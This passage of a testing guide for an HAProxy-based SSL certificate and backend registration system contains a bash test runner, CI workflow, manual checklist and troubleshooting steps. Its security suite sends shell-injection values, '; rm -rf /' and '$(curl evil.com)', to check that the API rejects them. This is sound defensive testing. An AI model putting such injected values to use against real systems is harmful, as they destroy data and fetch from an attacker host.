    # 2.4 Get specific
    HTTP_CODE=$(curl -s -o /tmp/get-backend.json -w '%{http_code}' \
        http://localhost:8404/v1/backends/test.example.com)
    [[ "$HTTP_CODE" == "200" ]] \
        && pass "2.4 get specific backend (200)" \
        || fail "2.4 get specific backend" "expected 200, got $HTTP_CODE"

    # 2.5 Idempotent
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}')
    [[ "$HTTP_CODE" == "200" ]] \
        && pass "2.5 idempotent re-registration (200)" \
        || fail "2.5 idempotent" "expected 200, got $HTTP_CODE"

    # 2.6 Conflict
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"test.example.com","container":"different-container","http_port":80,"https_port":443}')
    [[ "$HTTP_CODE" == "409" ]] \
        && pass "2.6 conflict detection (409)" \
        || fail "2.6 conflict" "expected 409, got $HTTP_CODE"

    # 2.7 Config file
    if docker exec haproxy-test cat /etc/haproxy/conf.d/20-backends.cfg 2>/dev/null \
        | grep -q 'ssl-test-service'; then
        pass "2.7 config file contains backend"
    else
        fail "2.7 config file" "backend not found in generated config"
    fi

    # 2.8 Domain map
    if docker exec haproxy-test cat /etc/haproxy/maps/http-domains.map 2>/dev/null \
        | grep -q 'test.example.com'; then
        pass "2.8 domain map contains domain"
    else
        fail "2.8 domain map" "domain not found in map file"
    fi

    # 2.10 Unregister
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        -X DELETE http://localhost:8404/v1/backends/test.example.com)
    [[ "$HTTP_CODE" == "204" ]] \
        && pass "2.10 unregister (204)" \
        || fail "2.10 unregister" "expected 204, got $HTTP_CODE"

    # Verify removal
    if ! curl -s http://localhost:8404/v1/backends | jq -r '.backends[].domain' | grep -q 'test.example.com'; then
        pass "2.10b domain removed from list"
    else
        fail "2.10b domain removal" "domain still in list after DELETE"
    fi

    # 2.11 Force reload
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:8404/v1/reload)
    [[ "$HTTP_CODE" == "200" ]] \
        && pass "2.11 force reload (200)" \
        || fail "2.11 force reload" "expected 200, got $HTTP_CODE"

    # 2.12 Get non-existent
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        http://localhost:8404/v1/backends/nonexistent.example.com)
    [[ "$HTTP_CODE" == "404" ]] \
        && pass "2.12 non-existent backend (404)" \
        || fail "2.12 non-existent" "expected 404, got $HTTP_CODE"
}

# ---- Suite 3: HAProxy Integration ----

suite_3() {
    log ""
    log "========================================"
    log "Suite 3: HAProxy Integration (HTTP Routing)"
    log "========================================"

    # Ensure HAProxy is running
    if ! container_running haproxy-test; then
        skip "3.x HAProxy not running (run suite 2 first)"
        return
    fi

    # Start test service
    docker rm -f ssl-test-service 2>/dev/null || true
    docker run -d --name ssl-test-service \
        --network "$NETWORK" \
        ssl-test-service:latest
    wait_for_container ssl-test-service 15

    # Register
    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}' \
        >/dev/null 2>&1

    sleep 2

    # 3.1 HTTP routing
    local RESPONSE
    RESPONSE=$(curl -sf -H "Host: test.example.com" http://localhost:8080/health 2>/dev/null || echo "")
    if echo "$RESPONSE" | jq -r '.status' 2>/dev/null | grep -q 'ok'; then
        pass "3.1 HTTP routing reaches test service"
    else
        fail "3.1 HTTP routing" "response: $RESPONSE"
    fi

    # 3.2 Unregistered domain
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
        -H "Host: unknown.example.com" http://localhost:8080/health)
    [[ "$HTTP_CODE" == "503" ]] \
        && pass "3.2 unregistered domain returns 503" \
        || fail "3.2 unregistered domain" "expected 503, got $HTTP_CODE"

    # 3.3 No Host header
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/health)
    [[ "$HTTP_CODE" == "503" || "$HTTP_CODE" == "400" ]] \
        && pass "3.3 no Host header returns $HTTP_CODE" \
        || fail "3.3 no Host header" "expected 503/400, got $HTTP_CODE"

    # 3.4 Multiple backends
    docker rm -f ssl-test-service-2 2>/dev/null || true
    docker run -d --name ssl-test-service-2 \
        --network "$NETWORK" \
        ssl-test-service:latest
    wait_for_container ssl-test-service-2 15

    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"other.example.com","container":"ssl-test-service-2","http_port":80,"https_port":443}' \
        >/dev/null 2>&1
    sleep 2

    local C1 C2
    C1=$(curl -sf -H "Host: test.example.com" http://localhost:8080/health | jq -r '.container' 2>/dev/null || echo "")
    C2=$(curl -sf -H "Host: other.example.com" http://localhost:8080/health | jq -r '.container' 2>/dev/null || echo "")
    if [[ -n "$C1" && -n "$C2" && "$C1" != "$C2" ]]; then
        pass "3.4 multiple backends routed independently"
    else
        fail "3.4 multiple backends" "C1=$C1 C2=$C2"
    fi

    # Cleanup second service
    curl -s -X DELETE http://localhost:8404/v1/backends/other.example.com >/dev/null 2>&1
    docker rm -f ssl-test-service-2 2>/dev/null || true
}

# ---- Suite 6: Failure Modes ----

suite_6() {
    log ""
    log "========================================"
    log "Suite 6: Failure Modes"
    log "========================================"

    # 6.1 HAProxy unreachable -- expect exit code 13
    local OUTPUT EXIT
    docker run --rm \
        -e SSL_DOMAIN=test.local \
        -e HAPROXY_HOST=nonexistent-host \
        -e HAPROXY_API_PORT=8404 \
        ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1 || true
    EXIT=$?
    if [[ $EXIT -eq 13 ]]; then
        pass "6.1 HAProxy unreachable exits with code 13"
    else
        fail "6.1 HAProxy unreachable" "expected exit 13, got $EXIT"
    fi

    # 6.2 Domain not reachable -- expect exit code 10
    docker run --rm \
        --network "$NETWORK" \
        -e SSL_DOMAIN=unreachable.example.com \
        -e HAPROXY_HOST=haproxy-test \
        -e HAPROXY_API_PORT=8404 \
        -e SSL_TEST_MODE=0 \
        ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1 || true
    EXIT=$?
    if [[ $EXIT -eq 10 ]]; then
        pass "6.2 unreachable domain exits with code 10"
    else
        fail "6.2 unreachable domain" "expected exit 10, got $EXIT"
    fi
}

# ---- Suite 7: Non-HAProxy Mode ----

suite_7() {
    log ""
    log "========================================"
    log "Suite 7: Non-HAProxy Mode (Direct)"
    log "========================================"

    # 7.1 Direct mode with SSL_TEST_MODE
    docker rm -f ssl-direct 2>/dev/null || true
    docker run -d --name ssl-direct \
        -p 9080:80 -p 9443:443 \
        -e SSL_DOMAIN=test.local \
        -e SSL_TEST_MODE=1 \
        ssl-test-service:latest
    sleep 3

    local RESPONSE
    RESPONSE=$(curl -sf http://localhost:9080/health 2>/dev/null || echo "")
    if echo "$RESPONSE" | jq -r '.status' 2>/dev/null | grep -q 'ok'; then
        pass "7.1a direct HTTP works"
    else
        fail "7.1a direct HTTP" "response: $RESPONSE"
    fi

    RESPONSE=$(curl -sk https://localhost:9443/health 2>/dev/null || echo "")
    if echo "$RESPONSE" | jq -r '.ssl' 2>/dev/null | grep -q 'true'; then
        pass "7.1b direct HTTPS works"
    else
        fail "7.1b direct HTTPS" "response: $RESPONSE"
    fi
    docker rm -f ssl-direct 2>/dev/null || true

    # 7.2 Direct mode without SSL_DOMAIN
    docker rm -f ssl-direct-nossl 2>/dev/null || true
    docker run -d --name ssl-direct-nossl \
        -p 9080:80 \
        -e SSL_DOMAIN="" \
        ssl-test-service:latest
    sleep 2

    RESPONSE=$(curl -sf http://localhost:9080/health 2>/dev/null || echo "")
    if echo "$RESPONSE" | jq -r '.status' 2>/dev/null | grep -q 'ok'; then
        pass "7.2 direct HTTP-only works"
    else
        fail "7.2 direct HTTP-only" "response: $RESPONSE"
    fi

    if docker logs ssl-direct-nossl 2>&1 | grep -iqE "skip|no.*domain|ssl not configured"; then
        pass "7.2b logs confirm SSL skipped"
    else
        fail "7.2b SSL skip log" "no skip message in logs"
    fi
    docker rm -f ssl-direct-nossl 2>/dev/null || true

    # 7.3 No HAPROXY_HOST skips registration
    local OUTPUT
    OUTPUT=$(docker run --rm \
        -e SSL_DOMAIN=test.local \
        -e HAPROXY_HOST="" \
        -e SSL_TEST_MODE=1 \
        ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1 || true)
    if ! echo "$OUTPUT" | grep -iqE "register.*haproxy|POST.*backend"; then
        pass "7.3 no HAPROXY_HOST skips registration"
    else
        fail "7.3 skip registration" "registration was attempted"
    fi
}

# ---- Suite 8: Race Conditions and Concurrency ----

suite_8() {
    log ""
    log "========================================"
    log "Suite 8: Race Conditions and Concurrency"
    log "========================================"

    if ! container_running haproxy-test; then
        skip "8.x HAProxy not running (run suite 2 first)"
        return
    fi

    # 8.2 Concurrent same-domain registration
    curl -s -o /tmp/race-a.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"race.example.com","container":"service-a","http_port":80,"https_port":443}' &
    local PID_A=$!
    curl -s -o /tmp/race-b.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"race.example.com","container":"service-b","http_port":80,"https_port":443}' &
    local PID_B=$!
    wait $PID_A; wait $PID_B
    local HTTP_A HTTP_B
    HTTP_A=$(tail -1 /tmp/race-a.json)
    HTTP_B=$(tail -1 /tmp/race-b.json)
    if { [[ "$HTTP_A" == "201" && "$HTTP_B" == "409" ]] || \
         [[ "$HTTP_A" == "409" && "$HTTP_B" == "201" ]]; }; then
        pass "8.2 concurrent same-domain: one 201, one 409"
    else
        fail "8.2 concurrent same-domain" "expected 201+409, got A=$HTTP_A B=$HTTP_B"
    fi
    curl -s -X DELETE http://localhost:8404/v1/backends/race.example.com >/dev/null 2>&1

    # 8.3 Concurrent different-domain registration
    curl -s -o /tmp/race-c.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"alpha.example.com","container":"service-alpha","http_port":80,"https_port":443}' &
    local PID_C=$!
    curl -s -o /tmp/race-d.json -w '\n%{http_code}' \
        -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"beta.example.com","container":"service-beta","http_port":80,"https_port":443}' &
    local PID_D=$!
    wait $PID_C; wait $PID_D
    local HTTP_C HTTP_D
    HTTP_C=$(tail -1 /tmp/race-c.json)
    HTTP_D=$(tail -1 /tmp/race-d.json)
    [[ "$HTTP_C" == "201" && "$HTTP_D" == "201" ]] \
        && pass "8.3 concurrent different-domain: both 201" \
        || fail "8.3 concurrent different-domain" "expected both 201, got C=$HTTP_C D=$HTTP_D"
    curl -s -X DELETE http://localhost:8404/v1/backends/alpha.example.com >/dev/null 2>&1
    curl -s -X DELETE http://localhost:8404/v1/backends/beta.example.com >/dev/null 2>&1

    # 8.4 Registration during config generation
    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"first.example.com","container":"service-first","http_port":80,"https_port":443}' >/dev/null 2>&1
    curl -s -X POST http://localhost:8404/v1/backends \
        -H 'Content-Type: application/json' \
        -d '{"domain":"second.example.com","container":"service-second","http_port":80,"https_port":443}' >/dev/null 2>&1
    sleep 2
    local RESPONSE
    RESPONSE=$(curl -s http://localhost:8404/v1/backends)
    if echo "$RESPONSE" | jq -r '.backends[].domain' | grep -q 'first.example.com' && \
       echo "$RESPONSE" | jq -r '.backends[].domain' | grep -q 'second.example.com'; then
        pass "8.4 sequential registration during config generation"
    else
        fail "8.4 config generation" "missing domain in list"
    fi
    curl -s -X DELETE http://localhost:8404/v1/backends/first.example.com >/dev/null 2>&1
    curl -s -X DELETE http://localhost:8404/v1/backends/second.example.com >/dev/null 2>&1
}

# ---- Suite 9: Failure Recovery ----

suite_9() {
    log ""
    log "========================================"
    log "Suite 9: Failure Recovery"
    log "========================================"

    if ! container_running haproxy-test; then
        skip "9.x HAProxy not running (run suite 2 first)"
        return
    fi

    # 9.1 API process crash recovery
    docker exec haproxy-test pkill -f registration-api.py 2>/dev/null || true
    sleep 3
    local HTTP_CODE
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8404/v1/health)
    [[ "$HTTP_CODE" == "200" ]] \
        && pass "9.1 API crash recovery" \
        || fail "9.1 API crash recovery" "expected 200, got $HTTP_CODE"

    # 9.2 Corrupt domains.map handling
    docker exec haproxy-test sh -c 'echo "GARBAGE LINE" > /etc/haproxy/state/domains.map' 2>/dev/null || true
    HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:8404/v1/reload)
    [[ "$HTTP_CODE" == "500" ]] \
        && pass "9.2 corrupt map returns 500" \
        || fail "9.2 corrupt map" "expected 500, got $HTTP_CODE"
    # Verify HAProxy config still valid (rollback)
    if docker exec haproxy-test haproxy -c -f /etc/haproxy/haproxy.cfg >/dev/null 2>&1; then
        pass "9.2b HAProxy config still valid after corrupt map"
    else
        fail "9.2b HAProxy rollback" "config invalid after corrupt map"
    fi

    # 9.3 SSL_REQUIRED=false fallback
    docker rm -f ssl-fallback-test 2>/dev/null || true
    docker run -d --name ssl-fallback-test \
        --network "$NETWORK" \
        -p 9180:80 \
        -e SSL_DOMAIN=invalid.test \
        -e SSL_REQUIRED=false \
        -e SSL_TEST_MODE=0 \
        ssl-test-service:latest
    sleep 5
    if docker inspect -f '{{.State.Running}}' ssl-fallback-test 2>/dev/null | grep -q true; then
        pass "9.3a container stays running with SSL_REQUIRED=false"
    else
        fail "9.3a SSL fallback" "container exited"
    fi
    if curl -sf http://localhost:9180/health >/dev/null 2>&1; then
        pass "9.3b HTTP serving after SSL failure"
    else
        fail "9.3b SSL fallback HTTP" "HTTP not available"
    fi
    if docker logs ssl-fallback-test 2>&1 | grep -iqE "warn|fallback|ssl.*fail"; then
        pass "9.3c warning in logs"
    else
        fail "9.3c SSL fallback warning" "no warning in logs"
    fi
    docker rm -f ssl-fallback-test 2>/dev/null || true
}

# ---- Suite 10: Security ----

suite_10() {
    log ""
    log "========================================"
    log "Suite 10: Security"
    log "========================================"

    if ! container_running haproxy-test; then
        skip "10.x HAProxy not running (run suite 2 first)"
        return
    fi

    # 10.1 Shell injection via domain
    local HTTP_CODE
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8404/v1/backends \
        -H "Content-Type: application/json" \
        -d '{"domain":"; rm -rf /","container":"evil","http_port":80}')
    [[ "$HTTP_CODE" == "422" ]] \
        && pass "10.1 shell injection via domain rejected (422)" \
        || fail "10.1 shell injection domain" "expected 422, got $HTTP_CODE"

    # 10.2 Shell injection via container name
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:8404/v1/backends \
        -H "Content-Type: application/json" \
        -d '{"domain":"safe.com","container":"$(curl evil.com)","http_port":80}')
    [[ "$HTTP_CODE" == "422" ]] \
        && pass "10.2 shell injection via container rejected (422)" \
        || fail "10.2 shell injection container" "expected 422, got $HTTP_CODE"
}

# ---- Suite 11: Certificate Lifecycle ----

suite_11() {
    log ""
    log "========================================"
    log "Suite 11: Certificate Lifecycle"
    log "========================================"

    # 11.1 Existing cert reuse on restart
    docker rm -f ssl-cert-test 2>/dev/null || true
    docker volume create letsencrypt-data 2>/dev/null || true
    docker run -d --name ssl-cert-test \
        --network "$NETWORK" \
        -e SSL_DOMAIN=cert.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5
    docker stop ssl-cert-test >/dev/null 2>&1
    docker rm ssl-cert-test >/dev/null 2>&1
    docker run -d --name ssl-cert-test \
        --network "$NETWORK" \
        -e SSL_DOMAIN=cert.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5
    if docker logs ssl-cert-test 2>&1 | grep -iqE "existing.*cert|reuse|skip.*certbot|already.*exists"; then
        pass "11.1 existing cert reused on restart"
    else
        fail "11.1 cert reuse" "no reuse message in logs"
    fi
    docker rm -f ssl-cert-test 2>/dev/null || true
    docker volume rm letsencrypt-data 2>/dev/null || true

    # 11.2 Expired cert triggers re-acquisition
    docker volume create letsencrypt-data 2>/dev/null || true
    docker run --rm -v letsencrypt-data:/etc/letsencrypt alpine sh -c '
        mkdir -p /etc/letsencrypt/live/expired.test
        apk add --no-cache openssl >/dev/null 2>&1
        openssl req -x509 -newkey rsa:2048 \
            -keyout /etc/letsencrypt/live/expired.test/privkey.pem \
            -out /etc/letsencrypt/live/expired.test/fullchain.pem \
            -days -1 -nodes -subj "/CN=expired.test" 2>/dev/null
    ' 2>/dev/null
    docker rm -f ssl-expired-test 2>/dev/null || true
    docker run -d --name ssl-expired-test \
        --network "$NETWORK" \
        -e SSL_DOMAIN=expired.test \
        -e SSL_TEST_MODE=1 \
        -v letsencrypt-data:/etc/letsencrypt \
        ssl-test-service:latest
    sleep 5
    if docker logs ssl-expired-test 2>&1 | grep -iqE "expir|renew|new cert|certbot"; then
        pass "11.2 expired cert triggers renewal"
    else
        fail "11.2 expired cert" "no renewal message in logs"
    fi
    docker rm -f ssl-expired-test 2>/dev/null || true
    docker volume rm letsencrypt-data 2>/dev/null || true
}

# ---- Main ----

main() {
    log "SSL Management System -- Test Runner"
    log "====================================="

    setup

    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "1" ]]; then suite_1; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "2" ]]; then suite_2; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "3" ]]; then suite_3; fi
    # Suites 4 and 5 require pebble -- run via docker-compose
    if [[ "$SUITE_FILTER" == "4" ]]; then
        log ""
        log "Suite 4 requires pebble. Run via docker-compose:"
        log "  docker compose -f docker-compose.test.yml up -d pebble pebble-challtestsrv haproxy"
        log "  Then run individual test 4.x commands from TESTING_INSTRUCTIONS.md"
        skip "4.x pebble-based tests (run manually)"
    fi
    if [[ "$SUITE_FILTER" == "5" ]]; then
        skip "5.x renewal tests (run manually)"
    fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "6" ]]; then suite_6; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "7" ]]; then suite_7; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "8" ]]; then suite_8; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "9" ]]; then suite_9; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "10" ]]; then suite_10; fi
    if [[ "$SUITE_FILTER" == "all" || "$SUITE_FILTER" == "11" ]]; then suite_11; fi

    # Summary
    log ""
    log "========================================"
    log "RESULTS"
    log "========================================"
    echo -e "  ${GREEN}PASS${NC}: $PASS_COUNT"
    echo -e "  ${RED}FAIL${NC}: $FAIL_COUNT"
    echo -e "  ${YELLOW}SKIP${NC}: $SKIP_COUNT"

    if [[ ${#FAILURES[@]} -gt 0 ]]; then
        log ""
        log "Failures:"
        for f in "${FAILURES[@]}"; do
            echo -e "  ${RED}-${NC} $f"
        done
    fi

    log ""
    if [[ $FAIL_COUNT -gt 0 ]]; then
        log "${RED}FAILED${NC}"
        exit 1
    else
        log "${GREEN}ALL TESTS PASSED${NC}"
        exit 0
    fi
}

main
```

### Execution Flow

1. **Parse arguments** -- filter suites, set verbosity, configure cleanup behavior
2. **Setup** -- create Docker network
3. **Run suites sequentially** -- each suite manages its own container lifecycle
4. **Report** -- summary with pass/fail/skip counts and failure details
5. **Cleanup** -- remove all test containers and networks (unless `--no-cleanup`)

### Running

```bash
cd docker/tests

# Run all suites
./test-ssl-system.sh

# Run only suite 2 (HAProxy API)
./test-ssl-system.sh --suite 2

# Keep containers for debugging
./test-ssl-system.sh --no-cleanup

# Verbose output
./test-ssl-system.sh --verbose
```

---

## 7. Failure Mode Testing

### Summary Table

| Test | Failure Condition | Environment Variables | Expected Exit Code | Expected Behavior |
|---|---|---|---|---|
| 6.1 | HAProxy host does not exist | `HAPROXY_HOST=nonexistent-host` | 13 | Error about connection/DNS |
| 6.2 | Domain does not resolve | `SSL_DOMAIN=unreachable.example.com` | 10 | Error about reachability |
| 6.3 | ACME server unreachable | `ACME_SERVER=https://nonexistent:14000/dir` | 11 | Certbot error |
| 6.4 | HAProxy API returns 500 | Mock API returning 500 on POST | 13 | Registration error |
| 6.5 | Port 80 occupied | Another process on :80 inside container | Non-zero | Port conflict error |

### Simulating Each Failure

**HAProxy unreachable:** Set `HAPROXY_HOST` to a hostname that does not exist on the Docker network. The container will fail to connect to the API.

**Domain not reachable:** Use a real-looking but unresolvable domain. The ssl-setup script should test external reachability (e.g., via `curl` or `dig`) before attempting certbot.

**Certbot failure:** Point `ACME_SERVER` to a non-existent host. Certbot will fail to connect and exit non-zero.

**API error:** Run a minimal Python HTTP server that returns 500 on all POST requests. The ssl-setup script should check the HTTP response code from the registration call.

**Port conflict:** Start a background process on port 80 inside the container before running ssl-setup. The script should detect the port is occupied (e.g., via `ss` or `lsof` or by catching the bind error).

### Error Message Quality Checklist

For every failure mode, verify:

- [ ] The error message identifies WHAT failed (e.g., "HAProxy registration failed")
- [ ] The error message includes actionable detail (e.g., "Could not connect to haproxy-test:8404")
- [ ] The exit code is non-zero
- [ ] No stack traces or raw Python/bash errors leak to the user
- [ ] The container does NOT start the main service after a failure (it exits)

---

## 8. CI/CD Integration

### GitHub Actions Workflow

Place this at `.github/workflows/test-ssl.yml`:

```yaml
name: SSL Management System Tests

on:
  pull_request:
    paths:
      - 'docker/**'
      - '.github/workflows/test-ssl.yml'
  push:
    branches: [master]
    paths:
      - 'docker/**'

jobs:
  test-ssl:
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build ssl-manager base image
        run: |
          cd docker
          docker build -t ssl-manager:latest -f Dockerfile.ssl-manager .

      - name: Build HAProxy API image
        run: |
          cd docker
          docker build -t haproxy-api:test -f Dockerfile.haproxy-api .

      - name: Build test service image
        run: |
          cd docker/tests
          docker build -t ssl-test-service:latest -f Dockerfile.test-service .

      - name: Run test suites 1, 2, 3, 6, 7
        run: |
          cd docker/tests
          chmod +x test-ssl-system.sh
          ./test-ssl-system.sh

      - name: Run pebble-based tests (Suite 4)
        run: |
          cd docker/tests
          docker compose -f docker-compose.test.yml up -d pebble pebble-challtestsrv haproxy
          sleep 10

          # Test 4.2: Self-signed mode
          docker run --rm \
            --network test-haproxy-net \
            -e SSL_DOMAIN=test.local \
            -e SSL_TEST_MODE=1 \
            ssl-test-service:latest /usr/local/bin/ssl-setup

          docker compose -f docker-compose.test.yml down

      - name: Upload test logs
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: test-logs
          path: /tmp/ssl-test-*.log
          retention-days: 7
```

### CI Performance Target

- Total test time target: under 5 minutes
- Image builds: cached via Docker layer caching in CI
- No real domain or public DNS required
- No secrets or credentials required
- All tests are self-contained within Docker networks

### Required Images for CI

| Image | Built From | Purpose |
|---|---|---|
| `ssl-manager:latest` | `docker/Dockerfile.ssl-manager` | Base image with certbot and SSL tools |
| `haproxy-api:test` | `docker/Dockerfile.haproxy-api` (custom-built from `haproxy:lts`) | HAProxy with registration API |
| `ssl-test-service:latest` | `docker/tests/Dockerfile.test-service` | Dummy HTTPS service for testing |
| `letsencrypt/pebble:latest` | Docker Hub (pulled) | Mock ACME server |
| `letsencrypt/pebble-challtestsrv:latest` | Docker Hub (pulled) | Challenge test server |

---

## 9. Manual Testing Checklist

For human verification on a real domain with real Let's Encrypt certificates.

### Prerequisites

- [ ] A server with ports 80 and 443 open to the internet
- [ ] A domain name pointing to the server (A record)
- [ ] Docker and docker-compose installed
- [ ] HAProxy running on the server

### Steps

- [ ] 1. Build images: `ssl-manager`, `haproxy-api`, and the Fulcrum service image
- [ ] 2. Start HAProxy: `docker compose up -d` in the haproxy directory
- [ ] 3. Verify HAProxy API: `curl http://localhost:8404/v1/health`
- [ ] 4. Start the service with SSL:
  ```bash
  docker run -d --name fulcrum-ssl \
      --network haproxy-net \
      -e SSL_DOMAIN=your.domain.com \
      -e HAPROXY_HOST=haproxy \
      -e HAPROXY_API_PORT=8404 \
      -e ACME_EMAIL=your@email.com \
      fulcrum-alpha:latest
  ```
- [ ] 5. Watch logs: `docker logs -f fulcrum-ssl`
- [ ] 6. Verify registration: `curl http://localhost:8404/v1/backends/your.domain.com`
- [ ] 7. Test HTTP: `curl -H "Host: your.domain.com" http://localhost:80/`
- [ ] 8. Wait for certbot to complete (check logs for "Certificate obtained")
- [ ] 9. Test HTTPS: `curl https://your.domain.com:50002` (for Electrum SSL port)
- [ ] 10. Verify certificate: `echo | openssl s_client -connect your.domain.com:443 -servername your.domain.com 2>/dev/null | openssl x509 -noout -subject -issuer -dates`
- [ ] 11. Confirm issuer is "Let's Encrypt" (not self-signed)
- [ ] 12. Test renewal: `docker exec fulcrum-ssl certbot renew --dry-run`
- [ ] 13. Stop and restart container -- verify cert persists
- [ ] 14. Remove container and re-create -- verify cert is re-obtained

### Expected Timeline

| Step | Duration |
|---|---|
| Image builds (cached) | ~30 seconds |
| HAProxy startup | ~5 seconds |
| Service startup + HAProxy registration | ~5 seconds |
| Certbot certificate acquisition | 30-90 seconds |
| HTTPS verification | ~5 seconds |
| Total | ~2-3 minutes |

---

## 10. Troubleshooting

### Common Test Failures

#### "HAProxy API did not become ready in 30s"

**Cause:** The HAProxy container with the registration API failed to start.

**Diagnosis:**
```bash
docker logs haproxy-test
docker inspect haproxy-test --format '{{.State.ExitCode}}'
```

**Common fixes:**
- Ensure the `haproxy-api:test` image is built
- Check that port 8404 is not in use by another process: `ss -tlnp | grep 8404`
- Verify the HAProxy config is valid: `docker run --rm haproxy-api:test haproxy -c -f /etc/haproxy/haproxy.cfg`

#### "expected 201, got 000" on backend registration

**Cause:** curl could not connect to the API at all.

**Diagnosis:**
```bash
curl -v http://localhost:8404/v1/health
docker network inspect test-haproxy-net
```

**Common fixes:**
- Verify the HAProxy container is on the `test-haproxy-net` network
- Check port mapping: `docker port haproxy-test`

#### HTTP routing returns 503 for a registered domain

**Cause:** HAProxy cannot reach the backend container.

**Diagnosis:**
```bash
# Check if backend container is running
docker ps | grep ssl-test-service

# Check network connectivity
docker exec haproxy-test ping -c1 ssl-test-service

# Check HAProxy backend status
docker exec haproxy-test curl -s http://localhost:8404/v1/backends

# Check HAProxy logs for backend errors
docker logs haproxy-test 2>&1 | grep -i "backend\|server.*down\|no server"
```

**Common fixes:**
- Ensure the test service container is on the same network as HAProxy
- Ensure the container name matches exactly what was registered
- Wait longer after registration for HAProxy to reload (add `sleep 2`)

#### Self-signed HTTPS test fails with "connection refused"

**Cause:** The test service did not start HTTPS because the self-signed cert was not generated.

**Diagnosis:**
```bash
docker logs ssl-test-selfsigned
docker exec ssl-test-selfsigned ls -la /etc/ssl/certs/server.crt /etc/ssl/private/server.key
```

**Common fixes:**
- Verify `SSL_TEST_MODE=1` is set
- Check ssl-setup logs for certificate generation errors
- Verify openssl is available in the container

#### Pebble tests fail with "certificate verify failed"

**Cause:** Certbot does not trust pebble's CA.

**Diagnosis:**
```bash
curl -sk https://pebble:14000/dir
```

**Common fixes:**
- Use `--no-verify-ssl` flag with certbot when using pebble
- Set `REQUESTS_CA_BUNDLE` to pebble's CA cert path
- Use `PEBBLE_VA_ALWAYS_VALID=1` to skip challenge validation

#### Cleanup fails with "No such container"

**Cause:** The test did not create all expected containers (e.g., an earlier test failed).

**This is not a real failure.** The cleanup function uses `|| true` to ignore missing containers. If you see this in the test output, focus on the actual test failures above it.

### Debug Mode

To run tests with maximum visibility:

```bash
# Keep all containers running after tests
./test-ssl-system.sh --no-cleanup --verbose

# Inspect a specific container
docker logs ssl-test-service
docker exec -it ssl-test-service bash

# Watch HAProxy logs in real time
docker logs -f haproxy-test

# Inspect network
docker network inspect test-haproxy-net
```

### Resetting Test State

If tests leave behind stale state:

```bash
# Remove all test containers
docker rm -f ssl-test-service ssl-test-service-2 ssl-test-selfsigned \
    ssl-test-renew ssl-direct ssl-direct-nossl haproxy-test mock-api \
    pebble pebble-challtestsrv ssl-race-test ssl-fallback-test \
    ssl-cert-test ssl-expired-test 2>/dev/null

# Remove test volumes
docker volume rm letsencrypt-data 2>/dev/null

# Remove test network
docker network rm test-haproxy-net 2>/dev/null

# Remove test images (if you want a clean rebuild)
docker rmi ssl-test-service:latest ssl-manager:latest haproxy-api:test 2>/dev/null

# Clean up temp files
rm -rf /tmp/ssl-test-* /tmp/register.json /tmp/get-backend.json /tmp/conflict.json \
    /tmp/idempotent.json /tmp/race-*.json /tmp/corrupt-reload.json
```
